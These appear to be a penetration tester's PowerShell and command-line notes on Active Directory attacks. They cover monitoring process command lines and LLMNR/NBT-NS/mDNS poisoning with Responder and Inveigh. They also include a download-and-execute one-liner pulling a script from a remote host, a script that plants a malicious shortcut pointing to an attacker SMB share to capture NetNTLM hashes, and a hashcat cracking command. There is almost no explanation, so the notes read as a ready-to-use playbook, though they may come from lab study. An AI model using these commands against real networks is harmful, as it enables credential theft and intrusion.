# Traffic Capture
```powershell



```

# Process Command Lines
```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

Procmon.ps1

IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

# Poisining Attacks
### [LLMNR-NBTNS-mDNS Poisining](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)


# Capturing Hashes with a Malicious .lnk File
```powershell
sudo responder -I eth0 -dwv
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -Inspect Y

For Example:
[+] [2026-05-27T06:33:02] LLMNR request for GS-SVCSCAN received from 10.129.205.45 [inspect only]
[+] [2026-05-27T06:33:10] LLMNR request for GS-SVCSCAN received from 10.129.205.45 [inspect only]

PS C:\Tools> net share
Share name   Resource                        Remark
-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
Department Shares  C:\Department Shares

GS-SVCSCAN.lnk:
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Department Shares\GS-SVCSCAN.lnk")
$lnk.TargetPath = "\\172.16.20.45\share\icon.png"
$lnk.IconLocation = "%windir%\system32\shell32.dll, 4"
$lnk.Save()

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
